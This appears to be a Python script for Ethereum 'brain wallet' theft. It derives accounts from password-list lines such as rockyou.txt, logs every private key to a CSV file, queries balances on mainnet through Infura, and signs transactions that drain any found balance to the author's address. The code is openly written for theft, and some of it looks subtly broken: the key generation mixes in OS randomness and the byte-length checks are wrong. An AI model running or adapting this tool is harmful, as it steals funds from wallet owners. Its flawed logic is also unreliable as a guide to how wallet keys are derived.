#!/usr/bin/env python3

#############################################
#
# This script does the following:
#	Pulls entropy from a given file (Rockyou.txt or a similar password list works)
#	Creates an Ethereum wallet from this entropy
#	Saves the public and private keys of this wallet into a CSV file for future use
# 	Checks the balance
# 	In the infinitesimally small chance we found an active wallet, the keys are weak so let's steal the balance
#
# Project TODOs:
#	Verbosity setting
# 	Better error handling for web3 calls
#	Check for any ERC tokens, not just Ether specifically
#	Add more wordlists to source file
#	Allow for other-language wordlists
#	Pull in any source files in a directory
#	Generate mnemonic phrases for secondary fuzzing - https://github.com/de-centralized-systems/python-bip39/
#
#############################################

import csv, eth_utils
from web3 import Web3
from eth_account.account import Account
from sys import getsizeof # Because apparently it will shit the bed otherwise; TODO: why can't we just 'import sys'?

__author__ = "Mark Rudnitsky"
__copyright__ = "(C)2022 Mark Rudnitsky"
__credits__ = ["Mark Rudnitsky"]
__license__ = "GPLv3"
__version__ = "1.0"
__maintainer__ = "Mark Rudnitsky"
__status__ = "Prototype"

infuraKey = "UPDATE_TO_YOUR_OWN_API_KEY" # ETH mainnet API access through Infura
recipient = "YOUR_ETH_ADDRESS" # Transfer any found funds here
keygenFile = "rockyou2.txt" # For entropy, change as needed
dictFileName = "generated-keypairs.csv" # Database for generated keypairs, change as needed
maxGasPerTx = 150 # Max gas we're willing to pay to make our transaction go through; TODO: dynamically adjust based on market conditions?

infuraUrl = "https://mainnet.infura.io/v3/" + infuraKey
ganacheUrl = "http://127.0.0.1:7545" # Update if you change the Ganache defaults
web3 = Web3(Web3.HTTPProvider(infuraUrl)) # Mainnet
#web3 = Web3(Web3.HTTPProvider(ganacheUrl)) # Testnet
#print("Connected: {}".format(web3.isConnected())) # Double check our connection works

# Use the 'entropy' parameter to create an account
def generateAddress(entropy):
	tempAcct = Account.create(extra_entropy=entropy)
	pubKey = tempAcct.address # Public key/address
	privKey = tempAcct.key # Private key
	#privKey = encode_hex(tempAcct.key) # Usually won't work with Metamask &c but is human readable
	return pubKey, privKey

# Roll reporting into one function
def reporting(pubKey, privKey, balance):
	#header = ['Ether Wallet Public Key', 'Ether Wallet Private Key', 'ETH Balance']
	data = [pubKey, privKey, balance]
	with open(dictFileName, 'a+', encoding='UTF8', newline='') as dictionaryFile:
		writer = csv.writer(dictionaryFile)
		writer.writerow(data)

# The actual cracking and theft
def findANonZeroBalance(entropy):
	#print(str(entropy))
	# Create a wallet
	pubKey, privKey = generateAddress(entropy)

	nonce = web3.eth.getTransactionCount(pubKey)
	balance = web3.eth.getBalance(pubKey) # Balance in wei
	#print(web3.fromWei(balance, "ether"))
	
	# Save relevant data
	reporting(pubKey, privKey, balance)

	# Jackpot
	if (balance > 0): # 1 in 2^256 chance this condition is true
		# Generate a send-to-us transaction
		# TODO: Sanity check payload
		# Max gas we're willing to pay to make our transaction go through
		maxGasPerTx = 150 # Max gas we're willing to pay to make our transaction go through
		tx = {
		    'nonce': nonce,
		    'to': recipient,
		    'value': balance,
		    'gas': 2000000,		  
		    'gasPrice': web3.toWei(maxGasPerTx, 'gwei')
		}

		signed_tx = web3.eth.account.signTransaction(tx, privKey)
		tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
		#print(web3.toHex(tx_hash))	

# Main function
def main():
	print("[INFO] Generating keys, this will take a while ...")
	# Open up our source of entropy
	sourceFile = open(keygenFile)

	for lineNum, textLine in enumerate(sourceFile):
		# Get the line from the file and format it for our Ethereum tools
		# TODO: More encodings besides UTF-8, necessary if we use non-English language wordlists
		tempLine = str(textLine).strip()
		tempLine = bytes(tempLine, 'utf-8')

		# Generate address permutations
		tempLineByteLength = getsizeof(tempLine)
		
		# Do basic entropy permutations
		# Only allowed keylengths are defined in BIP39 
		for maxByteLength in [128, 160, 192, 224, 256]:
			# Too long, just use the first or last maxByteLength bytes
			# TODO: Potentially do every maxByteLength-length permutation of tempLine?
			if (tempLineByteLength > maxByteLength):
				# First maxByteLength bytes
				findANonZeroBalance(tempLine[:maxByteLength])

				# Last maxByteLength bytes
				findANonZeroBalance(tempLine[len(tempLine) - maxByteLength:])

			# Edge case - line doesn't exist or isnt working
			elif (tempLineByteLength < 0):
				findANonZeroBalance('')

			# Proper length entropy
			else:
				# TODO: Do every permutation of padding (1L-255R, 2L-254R, 3L-253R, etc)
				pad = maxByteLength - tempLineByteLength

				# Pad on the left
				findANonZeroBalance(bytes(pad) + tempLine)
			
				# Pad on the right
				findANonZeroBalance(tempLine + bytes(pad))

				# Pad 50/50 Left/Right split
				findANonZeroBalance(bytes(int(pad / 2)) + tempLine + bytes(int(pad / 2)) + bytes(int(pad % 2)))
				
	print("[INFO] Keygen complete, please check \'" + dictFileName + "\' in this directory for details.")
	sourceFile.close()

# Main function
if __name__=="__main__":
    main()
